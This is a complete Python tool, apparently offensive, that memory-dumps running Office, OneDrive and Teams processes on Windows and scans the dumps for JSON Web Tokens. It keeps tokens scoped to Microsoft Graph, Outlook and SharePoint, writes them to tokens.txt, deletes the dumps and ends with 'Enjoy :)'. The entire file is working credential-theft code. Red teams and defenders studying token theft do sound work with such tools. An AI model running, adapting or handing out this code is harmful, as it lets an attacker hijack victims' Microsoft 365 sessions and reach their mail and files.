import base64
import json
import os
import re
import ctypes  
import win32api
import win32con
import win32file
import psutil
import argparse
import shutil

dbghelp = ctypes.windll.dbghelp

known_processes = ["WINWORD", "ONENOTE", "POWERPNT", "OUTLOOK", "EXCEL", "OneDrive", "Teams"]


def createMiniDump(pid, file_name):
    pHandle = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_VM_READ,0, pid)
    fHandle = win32file.CreateFile(file_name,
                                   win32file.GENERIC_READ | win32file.GENERIC_WRITE,
                                   win32file.FILE_SHARE_READ | win32file.FILE_SHARE_WRITE,
                                   None,
                                   win32file.CREATE_ALWAYS,
                                   win32file.FILE_ATTRIBUTE_NORMAL,
                                   None)

    success = dbghelp.MiniDumpWriteDump(pHandle.handle,pid,fHandle.handle,2,None,None,None,)
    return success


def extract_office_processes(pids):
    # Iterate over all running process
    process_pairs = []
    if pids is not None:
        pids = [int(pid) for pid in pids]

    print("Found the following relevant running processes:")
    for proc in psutil.process_iter():
        try:
            # Get process name & pid from process object.
            processName = proc.name()
            processID = proc.pid

            if any(know_proc in processName for know_proc in known_processes) and pids is None:
                add_process(processName, processID, process_pairs)

            if pids is not None and processID in pids:
                add_process(processName, processID, process_pairs)

        except(psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

    print("\ndumped relevant processes\n")
    return process_pairs

def add_process(processName, processID, process_pairs):
    processName = processName.split(".")[0]
    process_pairs.append([processID, processName])
    print(f"{processName} -- {processID}")


def extract_tokens():
    known_aud = ["https://graph.microsoft.com/", "https://outlook.office365.com/", "https://outlook.office.com",
                 "sharepoint.com", '00000003-0000-0000-c000-000000000000']

    extract_tokens = set()
    files = os.listdir('.\\Dump')
    dump_files = [file for file in files if file.endswith(".DMP")]
    c = open('tokens.txt', 'w')

    for file in dump_files:
        with open(f'.\\DUMP\\{file}', 'rb') as f:
            print(f"trying to extract tokens from: {file}")
            s = f.read()
            results = re.findall(b'eyJ0eX[a-zA-Z0-9\._\-]+', s)
            for result in results:
                # extract and decode payload
                if b"." in result:
                    payload_encoded = result.decode('utf-8').split('.')[1]
                    padding = 4 - len(payload_encoded) % 4
                    try:
                        payload = (base64.urlsafe_b64decode(payload_encoded + padding * "=").decode('utf-8'))
                    except:
                        continue

                    try:
                        js = json.loads(payload)
                        aud = js['aud']
                        scp = js['scp']
                        if any(x in aud for x in known_aud) and aud not in extract_tokens:
                            extract_tokens.add(aud)
                            c.write("\n================================\n")
                            c.write(
                                f"\nextracted from: {file}\naudience: {aud}\nscope:{scp}\ntoken:\n{result.decode('utf-8')}")
                    except:
                        pass


def create_dump_files():
    try:
        pids = args["pids"]
        process_pairs = extract_office_processes(pids)
        try:
            os.mkdir("Dump")
        except:
            pass

        for pair in process_pairs:
            createMiniDump(pair[0], "Dump/" + str(pair[0]) + ".DMP")
        return True
    except:
        return False

# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    print('''
 _______      _                    _______  _             _               
(_______)    | |                  (_______)(_)           | |              
    _   ___  | |  _  _____  ____   _____    _  ____    __| | _____   ____ 
   | | / _ \ | |_/ )| ___ ||  _ \ |  ___)  | ||  _ \  / _  || ___ | / ___)
   | || |_| ||  _ ( | ____|| | | || |      | || | | |( (_| || ____|| |    
   |_| \___/ |_| \_)|_____)|_| |_||_|      |_||_| |_| \____||_____)|_|    
                                                                          
    ''')

    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument("-p", "--pids", default=None, help="Process pids to extract tokens from", nargs='+', type=int)
    args = vars(parser.parse_args())

    isDumpSucceeded = create_dump_files()

    if not isDumpSucceeded:
        print("Error in creating dump files :(")
        exit(1)

    extract_tokens()
    shutil.rmtree('Dump')
    print("\nTokens were extracted to tokens.txt! Enjoy :)")
